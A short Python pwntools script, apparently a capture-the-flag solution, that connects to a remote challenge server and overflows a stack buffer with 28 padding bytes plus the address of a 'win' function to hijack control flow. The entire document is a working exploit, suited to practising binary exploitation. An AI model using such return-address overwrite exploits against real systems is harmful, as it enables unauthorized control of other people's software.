from pwn import *

path='./files/return_time'

p = remote('alex.lukin.family', 1342)
# p = process(path)
binary = ELF(path)

payload = b'a'*28
payload += p32(binary.symbols['win'])

p.sendline(payload)
p.interactive()